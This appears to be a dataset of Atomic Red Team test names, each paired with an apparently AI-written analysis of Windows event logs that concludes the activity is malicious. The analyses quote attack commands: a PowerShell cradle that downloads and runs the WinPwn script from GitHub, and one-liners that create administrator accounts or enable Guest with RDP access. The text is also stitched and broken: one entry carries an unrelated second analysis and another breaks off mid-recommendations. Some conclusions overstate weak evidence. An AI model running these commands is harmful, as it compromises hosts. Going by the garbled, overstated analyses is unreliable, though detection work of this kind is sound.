WinPwn - Loot local Credentials - Safetykatz,"## Analysis of the Logs

Upon thorough review of the provided Windows event logs for the system ""Server002,"" several entries are found to suggest suspicious activity that warrants further investigation.

### Suspicious/Borrowed Behaviors:

1. **Event Log Clearing Activities:**  
   - **System EventID 104 & Security EventID 1102:** 
     - These events indicate that the logs for the System, Windows PowerShell, and Security have been cleared by the user ""admin_test."" This behavior is highly suspicious as it is often associated with an attempt to cover tracks after executing malicious activities.

2. **Unusual PowerShell Command Execution**:
   - **Sysmon EventID 1 & Windows PowerShell log EventID 600:**
     - The execution of PowerShell with a script downloaded from `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1` is highly suspicious. Such scripts could be used for executing post-exploitation tasks such as privilege escalation, lateral movement, or data exfiltration. The use of ""iex(new-object net.webclient)"" is particularly concerning as it is a common technique used to run scripts from the internet.

3. **Process Execution Analysis**:
   - The usage of ""wevtutil.exe"" that corresponds with log file clearing activities is suspicious. This utility is often used with malicious intent to clear or modify event logs, preventing the detection of unauthorized actions.
   - The `svchost.exe` processes recorded in multiple entries point towards a regular system operation of maintaining services. However, these entries coincide with timestamped log-on time shifts that are potentially attributable to time skew in the system – a tactic sometimes used for log obscuration.

### Conclusion:

Given the evidence of unauthorised log clearing, suspicious PowerShell script execution directly from the internet, and other associated entries, the activities within these logs can be confirmed as potentially malicious.

### Findings Resolution:

- **Resolution: MALICIOUS**

### Recommended Actions:

1. **Immediate Containment**: Isolate the affected host from the network to prevent further malicious activity or spread.
2. **Conduct a Full Forensic Investigation**: Review any other available logs, network traffic, and system changes to identify additional indicators of compromise.
3. **Script Analysis**: Retrieve and analyze the PowerShell script downloaded to determine its full capabilities and impact on the system.
4. **Review Access Logs**: Determine how 'admin_test' credentials were used or compromised and review associated access logs.
5. **Strengthen Security Measures**: Consider enhancing logging, modifying firewall rules, implementing stricter access controls, and ensuring endpoint protection solutions are in place and active.

By conducting the above steps, a clearer picture of the compromise can be determined, aiding in recovery and future prevention efforts."
Download Macro-Enabled Phishing Attachment,"After reviewing the provided event logs for the Windows host `Server002`, several indications of possibly malicious activity were found:

1. **PowerShell Activity:**
   - Multiple PowerShell logs indicate the execution of a script (`powershell.exe`) that attempts to download a file (`PhishingAttachment.xlsm`) from a URL (`https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm`). This behavior is suspicious, as it resembles a typical indicator of a phishing attack or malicious download activity.

2. **Event Log Clearing:**
   - The Security and Sysmon logs reveal that the event logs were cleared (Event ID 1102 in the Security log and Event ID 104 in the System log). This is commonly a red flag of malicious activity, as attackers often clear event logs to cover their tracks.

3. **Process Activities:**
   - The Sysmon logs show multiple command-line executions related to `wevtutil.exe` with the 'cl' (clear) command for clearing logs for applications like PowerShell, System, and Security channels. The user `SERVER002\admin_test` has a high-integrity level and was responsible for these actions, which raises suspicions about intentional log tampering.

4. **Time Manipulation:**
   - Security log entries indicate system time changes (Event ID: 4616). Although operating systems can adjust time for synchronization purposes, this can mask other illicit activities if carried out manually by an intruder.

**Assessment:**
- The activity described in the logs, particularly the usage of PowerShell to download a seemingly harmful attachment and the clearing of logs across several channels, are strong indicators of potentially malicious actions.

**Resolution: MALICIOUS**
Based on these findings, there is substantial evidence that these logs indicate malicious activity. The following guidance is recommended:

- **Immediate Response:**
  - Isolate the machine `Server002` from the network to prevent further spread or data exfiltration.
  - Analyze the downloaded `PhishingAttachment.xlsm` file in a controlled sandbox environment to determine its purpose and any payloads it might carry.
  - Review access logs and credentials for `admin_test` to assess if the account has been compromised or misused.

- **Investigation:**
  - Conduct a deeper forensic analysis of `Server002` and any other machines that may have been in contact or exposed to similar activities.
  - Monitor network logs for any connections to suspicious IP addresses or domains.

- **Remediation:**
  - If required, perform a complete system restoration from a backup prior to this incident after ensuring no other unauthorized changes have been made to the system configurations within your network.
  - Strengthen security awareness training for users, particularly around the execution of scripts and opening attachments from untrusted sources."
Create local account with admin privileges,"### Detailed Analysis

#### Suspicious Activity Identified:

1. **Event Log Clearance:**
   - Multiple records show that logs from the System, Windows PowerShell, and Security channels were cleared (`EventID: 104`, `EventID: 1102`). This action is often indicative of malicious activity as attackers frequently clear logs to cover their tracks post-exploitation. The subject user responsible for these actions is `admin_test`, who seems to have initiated this on the host `Server002`.

2. **Account Manipulation:**
   - There is evidence of user account manipulation. A new user account, `art-test`, was created and added to the administrators group using the command line (`EventID: 4720`, `4722`, `4732`, `4728`). This could indicate an attempted privilege escalation or persistence mechanism by an attacker.

3. **Command Execution:**
   - Execution of potentially harmful commands was logged (`EventID: 5712`). The command utilized was:
     ```plaintext
     ""cmd.exe /c net user art-test /add & net user art-test -4RTisCool!-321 & net localgroup administrators art-test /add""
     ```
   - This command sequence creates a user with a set password and grants it administrative privileges. The use of command-line utilities in this manner is suspect.

4. **Use of `wevtutil`:**
   - The process `wevtutil.exe`, which is used to manage event logs, was executed multiple times in the sequence leading up to the log clearance. While the tool itself is benign, its usage pattern here in conjunction with log clearance is suspicious.

5. **Time Change Events:**
   - The system time was modified seemingly without cause (`EventID: 4616`). Unauthorized time changes can disrupt log analysis and system audits.

6. **Deployment of Tools:**
   - The `whoami.exe` and `hostname.exe` utilities were executed. These tools, while not inherently malicious, might be used in reconnaissance phases by an attacker to identify system details.

#### Additional Observations:

- The Sysmon logs reveal executions of Microsoft Edge Update processes. While these could be benign background activities due to software updates, they occurred coincidentally amid suspicious activities. 
- The `wevtutil.exe` executions leading up to log clearances, set within a tight timeframe, and initiated by the same 'admin_test' user indicate potentially scripted activities.
  
### Conclusion

Given the clear signs of deliberate log clearance, user account creation with administrative privileges through command-line operations, and the potential for privilege escalation, these logs strongly suggest malicious activity on the analyzed Windows host.

### Resolution

**MALICIOUS**

#### Guidance

- **Immediate Response:**
  - Isolate the affected system, `Server002`, from the network to prevent further unauthorized access or lateral movement.
  - Conduct a thorough forensic analysis to understand the full scope of the breach and identify potential persistence mechanisms left by the attacker.
  - Review and potentially reset credentials associated with the `admin_test` account, and any affected user accounts.

- **Containment and Recovery:**
  - Restore from known good backups if available, considering the potential compromise of system integrity.
  - Implement comprehensive log analysis and detection systems to prevent similar incidents in the future.

- **Preventive Measures:**
  - Enhance monitoring for log clearance activities and unauthorized account changes.
  - Apply least privilege principles to minimize the attack surface.
  - Educate users on recognizing phishing or suspicious activities to prevent credentials compromise."
Activate Guest Account,"Upon analyzing the provided Windows event logs, here are the key findings and analysis:

1. **Clearing of Event Logs**:
   - Security Event ID 1102 and System Event ID 104 indicate that the event logs for Security and System were cleared by the user `SERVER002\admin_test`. This activity is often associated with an attempt to hide malicious actions and is a red flag for potential malicious activity.

2. **Activation of Guest User Account**:
   - Sysmon Event IDs 17980, 17981, 17982, and 17983 detail the execution of a command `cmd.exe /c net user guest /active:yes` by `admin_test`, activating the Guest user account. This is a significant indicator of compromise because enabling a disabled guest account can allow unauthorized access with reduced tracking or auditing.

3. **Suspicious Use of `wevtutil.exe`**:
   - Sysmon logs indicate multiple usages of `wevtutil.exe` to clear logs (such as EventID 17964 and 17968). This parallels the event log clearing activity observed in the security logs and supports the hypothesis of an attempt to cover tracks.

4. **Time Changes**:
   - Security Event ID 4616 and System Event IDs 3569, 3572 reveal that there were time changes through `svchost.exe`. While not inherently malicious, significant time changes can be used in conjunction with other activities to evade detection timelines.

5. **Microsoft Edge Update Activity**:
   - Multiple Sysmon events are related to Microsoft Edge Update processes. While it’s normal for such processes to run, the volume and sequence of these events suggest an automated update was in progress. The activity appears legitimate and corresponds with standard software update behavior.

Based on the logs provided, there is clear evidence of potentially **malicious** activity, particularly:
- The clearing of event logs.
- The enabling of the Guest user account.
- Use of wevtutil for potentially unauthorized actions.

These are significant security concerns indicating a potential breach or compromise. My resolution after the analysis of the logs is:

**MALICIOUS**

### Recommendations:
1. **Immediate Response**:
    - **Isolate the Host**: Temporarily remove the affected system from the network to prevent further unauthorized access.
    - **User Account Review**: Disable or remove any unauthorized accounts, particularly the Guest account, and review the permissions and activities of the `admin_test` account.

2. **Forensic Analysis**:
    - Conduct a detailed forensic investigation to determine the scope of the compromise, including examining any unauthorized access or data exfiltration.

3. **Log Monitoring and Alerts**:
    - Implement stricter log monitoring and alerting for critical changes like log clearance and account modifications.

4. **Security Practices**:
    - Review and strengthen security policies to prevent recurrence, such as enforcing the principle of least privilege and multi-factor authentication.
   
Taking these steps will help in containing the threat and preventing future incidents."
Enable Guest account with RDP capability and admin privileges,"Upon reviewing the provided Windows event logs, several activities indicate potentially malicious behavior that warrant further investigation.

1. **Event Log Clearing:**
   - We observe multiple instances where logs were cleared on the system. Event ID 104 in the System log indicates that the event logs for the System and Windows PowerShell were cleared by the user `admin_test`. Additionally, Event ID 1102 from the Security log was also cleared. Log clearing is generally considered suspicious as it might indicate an attempt to cover tracks after malicious activities.

2. **Suspicious Command Execution:**
   - The Sysmon log contains an event where the `cmd.exe` executed a command line that significantly alters user permissions and system settings:
     ```
     ""cmd.exe"" /c net user guest /active:yes & net user guest Password123! & net localgroup Administrators guest /add & net localgroup ""Remote Desktop Users"" guest /add & reg add ""hklm\system\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add ""hklm\system\CurrentControlSet\Control\Terminal Server"" /v ""AllowTSConnections"" /t REG_DWORD /d 0x1 /f
     ```
   - This command activates the Guest account, sets a password, adds this account to the Administrators and Remote Desktop Users groups, and alters the Terminal Server registry keys to allow remote connections. This is highly indicative of an attempt to escalate privileges and establish a means for persistent remote access.

3. **Privilege Escalation:**
   - The logs show traces of the guest account being manipulated, with the user `admin_test` adding it to the Administrators group and changing its properties. Event IDs 4722 and 4732 in the Security log confirm this.

4. **Service and Process Execution:**
   - The execution of `wevtutil.exe` is linked with clearing event logs, which is another indication of malicious intent. 

Based on the analysis of these logs, the activities observed are highly consistent with malicious intent and likely indicate a compromise. The specific actions include full guest account activation and escalation of privileges, often associated with preparation for unauthorized remote access or lateral movement within a network. 

**Resolution: MALICIOUS**

**Guidance:**
- Immediately investigate the user `admin_test` and the actions associated with this account.
- Conduct a thorough audit of the machine `Server002` to check for additional unauthorized modifications, malware, or indicators of a broader compromise.
- Review access controls and ensure that logs are securely stored and protected to prevent tampering.
- Enhance monitoring of privileged accounts and deploy network-based intrusion detection to identify any further suspicious activity swiftly."
Word spawned a command shell and used an IP address in the command line,"Upon reviewing the provided Windows event logs, several indicators suggest potentially malicious or suspicious activity on the Windows host ""Server002"". Here's a detailed breakdown:

### Suspicious and Anomalous Behaviors:
1. **PowerShell Activity**:
   - The PowerShell logs indicate the execution of a script from an external source: `https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1`. This script is related to the Atomic Red Team's techniques for simulating adversary behavior, particularly those that deal with malicious document execution (`Invoke-MalDoc`). Such activity is highly suspicious as it involves using PowerShell to download and attempt to execute potentially harmful code.

2. **Log Clearance Events**:
   - Security Event Log ID 1102 indicates the audit log was cleared by a user (""admin_test""). Similarly, System Log ID 104 also shows the clearing of the System and Windows PowerShell logs. Log clearance can be an indication of an attacker hiding their tracks, which is a common post-exploitation tactic.

3. **Process Execution**:
   - The invocation of `wevtutil.exe` with commands to clear logs (across Application, System, and Security logs) is observed. This further supports attempts to cover up tracks.
   - The execution of `services.exe` and `taskhostw.exe` in certain contexts can sometimes be associated with malicious activity when seen with other indicators.
   - Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) are running multiple times in close succession, suggesting potential misuse or uncharacteristic behavior of legitimate software.

4. **Unusual System Changes**:
   - The presence of the script indicates possible privilege escalation or other unauthorized system changes.
   - `whoami.exe`, `hostname.exe`, `sc.exe`, and `svchost.exe` are seen, which are legitimate processes but can be used for enumeration and persistence when manipulated in a hostile context.

### Conclusion:
Based on the evidence above, particularly the PowerShell activity involving the execution of a potentially malicious script and the suspicious log clearance events aimed to obfuscate actions, it is reasonable to conclude that the event logs show signs of malicious activity. The combination of these indicators suggests that an unauthorized user may have gained access and is actively trying to perform or has already performed harmful operations.

### Resolution:
- **MALICIOUS**: The logs contain definitive signs of malicious activity. Immediate investigation and remediation actions are required.

### Recommended Actions:
1. **Immediate Isolation**: Isolate the affected host (Server002) from the network to prevent any further potentially harmful activity.
2. **Forensic Analysis**: Conduct a comprehensive forensic analysis on the machine to gather additional evidence and identify the full scope of the breach.
3. **Credential Changes**: As the user ""admin_test"" was involved in suspicious activities, reset credentials and review permissions for any potential misuse.
4. **Monitoring and Detection**: Increase monitoring on similar assets for signs of similar behavior, especially focusing on unusual PowerShell executions and log clearances.
5. **Patch and Update**: Ensure all systems are updated and patched to the latest versions to prevent exploitation of known vulnerabilities.

Importantly, engage your incident response team to handle this situation following your security protocols, and consider informing any relevant stakeholders as part of your organization's standard incident management process."
Octopus Scanner Malware Open Source Supply Chain,"After analyzing the provided Windows event logs, I have identified several indicators of potential malicious activities. Here are the key observations:

1. **Security Log (Event ID 1102)**:
   - The log indicates that the Security log was cleared by the user `admin_test` on `Server002`. This is a significant indicator of potential malicious behavior, as clearing event logs might be an attempt to erase evidence of unauthorized activities.

2. **System Log (Event ID 104)**:
   - There are multiple entries showing that event logs for the System and Windows PowerShell channels were cleared, again by the user `admin_test`. This is unusual and suspicious, as it may indicate an attempt to cover tracks.

3. **Sysmon Log**:
   - **Process Creation via cmd.exe**:
     - An entry shows a `cmd.exe` process with a command line that includes potentially malicious behavior: creating a scheduled task (`schtasks /create`) that runs a Java application (`javaw -jar`). The context and command structure suggest attempts at persistence and further execution of potentially harmful scripts or code.
   - **Scheduled Task Creation (schtasks.exe)**:
     - The scheduled task (`ExplorerSync`) created using `schtasks.exe` further supports the evidence of suspicious activities. The use of scheduled tasks to execute an unclear Java-based task is a typical method for maintaining persistence in a compromised system.

4. **Miscellaneous**:
   - Multiple executions of `wevtutil.exe` to clear logs (evident from Sysmon Event ID `1` and `5`) indicate this was most likely done programmatically, not for maintenance purposes.
   
### Assessment and Resolution:

- **Threat Assessment**: 
  - The collective evidence of log clearing, suspicious command execution, and scheduled task creation strongly indicate compromise by an unauthorized actor. The behaviors align with typical actions seen in system compromises intending to establish persistence and evade detection.

- **Resolution**: **MALICIOUS**
  - Given the irrefutable signs of suspicious behavior, including evidence tampering and system alterations, the activity documented in the logs is considered malicious. Immediate action is advised to contain and remediate the threat.

   - Conduct a comprehensive security audit of the network to identify and rectify similar vulnerabilities.
   - Implement stricter access controls and monitor privileged account activities closely.

This analysis and recommended response should guide the organization's response efforts to mitigate potential damage and strengthen future security posture."
Use PsExec to elevate to NT Authority\SYSTEM account,"Upon reviewing the provided Windows event logs from the machine ""Server002,"" several indicators suggest potential malicious activity and warrant further investigation. Here is a detailed analysis of the suspicious or anomalous behavior observed:

1. **Event Log Clearing:**
   - Multiple events indicate that security, system, and PowerShell log files were cleared (`Event ID: 1102` for security and `Event ID: 104` for system and PowerShell). This action was performed by the user `admin_test` within the same minute, suggesting an attempt to cover tracks after unauthorized actions.

2. **PsExec Usage:**
   - The presence of events showing the installation and execution of the `PSEXESVC` service (`EventID: 7045` and `Sysmon EventID: 1` with `Image: C:\\Windows\\PSEXESVC.exe`) is a common method for lateral movement and executing commands remotely with elevated privileges. This service was also run under the `SYSTEM` account, allowing high-level access and control over the system.

3. **Process Creation from Suspicious Locations:**
   - Execution of a command line via `cmd.exe` from a temporary folder (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\PsExec.exe`) indicates the use of a known penetration testing tool likely crafted to test the system's security or compromise it intentionally.
   - The use of `PsExec` to execute `whoami` (`EventRecordID: 18024`) in combination with `cmd.exe` from unusual paths and executing scripts indicate potential unauthorized activity.

4. **Privileged Logons and Elevated Privileges:**
   - Multiple `4624` and `4672` events show SYSTEM and high-privileged logons using the NT AUTHORITY\SYSTEM account, suggesting unauthorized attempts or scripted activities requiring administrative access.

5. **Suspicious Powershell & Command Line Activities:**
   - Various `wevtutil.exe` command lines executed by `admin_test` aim to clear specific Windows event logs (such as Sysmon) and these are logged (`Sysmon EventID: 1`) as coming from an administrator user, providing further indication of an attempt to cover tracks.

6. **Use of Known Exploit/Testing Tools:**
   - The temporary folder path and `PsExec.exe` usage resemble activity commonly associated with penetration testing tools like Atomic Red Team, which is used for simulating attacks and thus, further exploring unauthorized or testing behavior.

7. **Network Service and SYSTEM Processes:**
   - The excessive spawning of system processes under elevated privileges (`NT AUTHORITY\\SYSTEM` and `NT AUTHORITY\\NETWORK SERVICE`) could indicate the execution of system exploits or malware intended to maintain persistence or escalate privileges.

**Conclusion:**
Based on the evidence of event log clearing, use of PsExec tools, unauthorized process executions, and privilege escalation activities, the logs provide sufficient indicators of intentional malicious activity.

**Resolution: MALICIOUS**

**Guidance:**
1. Immediately isolate the affected system to prevent further unauthorized access.
2. Conduct a thorough forensic investigation to understand the full scope of the compromise.
3. Re-evaluate security policies, particularly those related to privileged access management.

### Analysis and Observations:

1. **PowerShell Activity**: 
   - The logs indicate a PowerShell command execution that downloads and executes a script from a GitHub repository (`S3cur3Th1sSh1t`). This is a known pattern for malicious activity, as PowerShell is often used by threat actors to execute scripts remotely due to its powerful scripting capabilities.
   - Specifically, the command executed is:
     ```
     powershell.exe & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';
     iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
     obfuskittiedump -consoleoutput -noninteractive}
     ```
   - The script WinPwn.ps1 appears suspicious as it suggests potential obfuscation (indicated by ""obfuskittiedump""), which is commonly used to hide malicious actions.

2. **Security Log Events**:
   - Event ID 1102: Indicates that the security log was cleared by the same user (`admin_test`). This action is commonly associated with attempts to cover tracks post-compromise.
   - Privileges such as `SeSecurityPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, among others, were assigned (Event ID 4672) which can be indicative of privilege escalation activities.

3. **Sysmon Log Highlights**:
   - Frequent execution of `wevtutil.exe` suggests potential log manipulation or clearing, which aligns with the security log clearing for obfuscation.
   - The presence of high-privileged processes initiated by `SERVER002\\admin_test` is concerning, as it shows an attempt possibly within the context of elevated permissions that could lead to further compromise activities.

4. **System Time Changes**: 
   - Time in the system log shows manipulations/events indicating possible attempts to evade detection mechanisms that rely on timestamp-based analysis. Notably, `svchost.exe` was involved with time changes (Event ID 4616).

5. **Regular Microsoft Edge Updates**:
   - Processes related to Microsoft Edge Update are observed; however, these align with regular update procedures and do not appear relevant to the immediate pattern of suspicious activities inferred from other activities.

### Threats and Risks:

The logs present indicators of compromise related to:
- Execution of potentially malicious PowerShell scripts.
- Actions to cover tracks such as security log clearing.
- Privilege escalation.
- Wevtutil.exe utilization in potentially malicious context.

USB Malware Spread Simulation,"### Analysis of Logs

#### Suspicious and Anomalous Behavior:

1. **PowerShell Logs:**
   - Multiple entries indicate the execution of a PowerShell script that attempts to identify and manipulate removable drives (`drivetype=2`). The script creates a file named `T1091Test1.txt` to simulate malware spread to removable drives. This type of activity is highly suspicious as it mimics known malware behaviors for lateral movement and data exfiltration via USB drives.

2. **System Logs and Sysmon Logs:**
   - There are entries that show the clearing of event logs (`wevtutil.exe cl ...` command). Clearing event logs is a common indicator of malicious activity as attackers often do this to cover their tracks.
   - The `admin_test` user is associated with processes that cleared various logs (System, Security, and PowerShell logs). This user initiated and executed commands to clear logs, which raises concerns about privilege misuse.

3. **Security Logs:**
   - Log entry ID 1102 indicates the security log was cleared, corresponding to actions observed in the System and Sysmon logs.
   - There are time change events (`EventID 4616`), which might correlate with attempts to manipulate timestamps for cover-up. The `svchost.exe` process is involved in this, potentially pointing to tampering with system time for obscuring log events.

#### Indicators of Malicious Activity:

- The behavior of the PowerShell script aligns with tactics, techniques, and procedures (TTPs) used by attackers to facilitate lateral movement and data exfiltration.
- The clearing of logs (System, Security, and PowerShell) is an established tactic for persistence and stealth by threat actors.
- The involvement of a specific user account (`admin_test`) in executing potentially harmful commands indicates possible insider threats or credential compromise.

### Assessment:

Given the evidence from the event logs, there are clear indicators of compromised activity:

- **Use of Powershell for suspicious activities** involving removable media.
- **Log clearing actions indiscriminately across multiple log types** indicates an attempt to hide traces of activity.
- **Insider or compromised account activity** observed through abnormal usage of high-integrity level processes.

### Threats and Risks Identified:

- Potential Malware Spread: The PowerShell script activity signifies an attempt or simulation of spreading malware via removable drives.
- Stealth and Evasion: The clearing of event logs poses a risk of undetected malicious activities, hindering further forensic analysis.
- Insider Threat or Account Compromise: The actions of `admin_test` suggest either insider threats or unauthorized use of privileged credentials.

- **MALICIOUS**: The activities recorded in the logs strongly indicate that malicious actions have taken place, aligned with tactics used in system compromises.

### Guidance:

1. **Immediate Actions:**
   - Isolate the impacted host (`Server002`) to prevent further potential spread of malware.
   - Conduct a thorough review of the `admin_test` account for unauthorized access and consider resetting credentials or more stringent access controls.

2. **Further Investigation:**
   - Examine additional logs and network traffic to identify potential data exfiltration and other compromised hosts within the network.
   - Perform a full antivirus and antimalware scan across all connected devices to assess and address the spread.

3. **Remediation Steps:**
   - Restore system from a clean backup, if possible.
   - Plan for thorough employee awareness training to mitigate insider threats and ensure best practices for account usage.

4. **Enhance Monitoring and Alerts:**
   - Implement real-time alerting for potentially malicious activities such as execution of PowerShell scripts that manipulate drives or commands that clear logs.
   - Increase the frequency of security audits and vulnerability assessments.

These actions should be taken in conjunction with policies aligned to the organization’s cybersecurity strategies and incident response plans."
Azure Persistence Automation Runbook Created or Modified,"Upon reviewing the provided Windows event logs, several actions stand out that merit further analysis, primarily pointing towards potentially suspicious or malicious activity:

1. **Security and System Logs:**
   - Event ID 1102 in the Security log indicates that the security log was cleared by the user `admin_test`. This event is suspicious because clearing event logs is often an action taken to cover up malicious activity.
   - Event ID 104 in the System log also indicates the clearing of logs for the System and Windows PowerShell channels by the same user. This further suggests an attempt to remove traces of activity from the system.

2. **Windows PowerShell Logs:**
   - PowerShell logs indicate the execution of a script involving secure credentials and Azure-related commands (`Connect-AzAccount`, `New-AzAutomationRunbook`). This is potentially suspicious for two reasons:
     - The use of PowerShell with encoded or complex commands might indicate an attempt to perform actions stealthily.
     - Creating or modifying Azure resources could suggest unauthorized changes if these actions were not sanctioned.

3. **Sysmon Logs:**
   - Multiple instances of `wevtutil.exe` (Windows Eventing Utility) are observed (Event IDs 18083, 18087, 18091, 18095, 18099), specifically clearing various logs as seen in their command lines. The direct clearing of logs through this tool is particularly concerning.
   - Instances of PowerShell execution (Event IDs 18079, 18111) suggest automated or scripted execution potentially connected to the initial PowerShell commands observed.
   - Use of the `whoami.exe` and `hostname.exe` tools (Event IDs 18107, 18103) indicates someone was querying user and machine information, which might be consistent with reconnaissance by an attacker.

**Assessment and Resolution:**

- **Assessment:** The combination of cleared logs, PowerShell activity involving credential objects, and the necessary usage of `wevtutil.exe` to delete log records is consistent with methods used by attackers to maintain persistence, conduct activities without detection, and cover their traces. The deliberate clearing of logs particularly points to an intent to hide malicious actions.
  
- **Resolution:** **MALICIOUS**. The logs demonstrate a clear pattern of activities that suggest malicious intent, specifically the act of clearing multiple log files combined with suspicious PowerShell activity. 

**Guidance on How to Proceed:**
- **Immediate Actions:**
  1. Isolate the affected machine (`Server002`) from the network to prevent further potential damage or data exfiltration.
  2. Conduct a full forensic analysis on the isolated machine to understand the extent of the compromise and identify any additional malicious artifacts.
  3. Reset credentials and closely monitor the account `admin_test` and any associated accounts for further suspicious activity.
  4. Ensure event logging is restarted and enabled to full capacity, and closely monitor logs for further signs of suspicious activity.
- **Long-term Actions:**
  1. Review security policies and implement stronger logging and monitoring practices.
  2. Educate staff on recognizing signs of potential threats and the importance of reporting them.
  3. Consider proactive threat hunting across the network to identify if similar activities have occurred on other hosts."
Running Chrome VPN Extensions via the Registry 2 vpn extension,"Based on the provided event logs, I'll provide a detailed analysis of key findings that might indicate suspicious or malicious activity:

### Analysis:

1. **Log Clearing Events (Security Event ID 1102, Sysmon Process Creation of wevtutil.exe)**
   - There are Security log clear events (Event ID 1102) and corresponding Sysmon entries indicating the use of `wevtutil.exe` by the user `admin_test`. This tool is often used to clear event logs and is a significant indicator of malicious activity, potentially covering tracks.

2. **PowerShell Activity (PowerShell Event ID 600)**
   - There is a notable PowerShell script execution which modifies registry entries related to Google Chrome extensions. 
   - The script creates new Chrome extension folders in the registry and sets their `update_url` to `https://clients2.google.com/service/update2/crx`. Modifying browser extensions through PowerShell could suggest an attempt to install or manage unauthorized browser add-ons, potentially for malicious purposes.

3. **System and Security Privilege Assignments (Security Event ID 4672)**
   - Multiple instances of `SYSTEM` account privilege assignments (Event ID 4672) are observed, listing extensive privileges including `SeDebugPrivilege`. While not outright malicious, the combination of this with other suspicious activities could suggest misuse or potential privilege escalation attempts.

4. **Taskhostw.exe Activity (Security Event ID 4798)**
   - Taskhost processes querying information about various user accounts (‘Administrator’, ‘admin_test’) might be a normal activity but in connection with log clearing and unauthorized PowerShell usage, it could be a reconnaissance step to identify user accounts for further exploitation.

5. **Credential Access Activity (Security Event ID 5379)**
   - Environment variables querying WindowsLive and MicrosoftAccount entries indicated attempts to access credential information. Coupled with other findings, it reinforces potential malicious intent to harvest user credentials.

6. **Unusual Process Execution: Sysmon Log**
   - Several unusual and potentially unauthorized system utility executions by `admin_test` are recorded in Sysmon logs, especially involving `wevtutil.exe` and PowerShell with suspicious and automated script execution.

### Conclusion:
Compiling the context from these event logs indicates a series of actions that are highly characteristic of malicious activity:

- **Events involving log clearing,** specifically the usage of `wevtutil.exe`, indicate potential attempts to cover tracks.
- **Unauthorized modification of system settings** through PowerShell and unusually high-level privileges assigned to system processes suggest abuse of administration capabilities.
- **Events tied to credential access and system information gathering** could suggest a preparation for lateral movement or exfiltration of sensitive data.

Given the presence of these indicators, the activity identified in the logs suggests potential compromise by a skilled adversary. 

### Resolution:
**MALICIOUS** - The activity exposed through these logs strongly indicates malicious behavior, possibly involving an insider threat or an external actor with elevated access privileges.

### Guidance:
1. **Immediate containment** - Isolate the affected system to prevent further unauthorized access.
2. **Thorough forensic investigation** - Conduct deeper analysis of file systems and network activities around the timeframe of these logs.
3. **Review account activity** - Examine and audit accounts, specifically those with elevated privileges like `admin_test`.
4. **Mitigation steps** - Apply patches, revise policies for script execution and privilege management, and enhance monitoring with more defined rules for unusual activities.
5. **Incident response engagement** - Engage incident response procedures to fully understand the extent and impact of the activity."
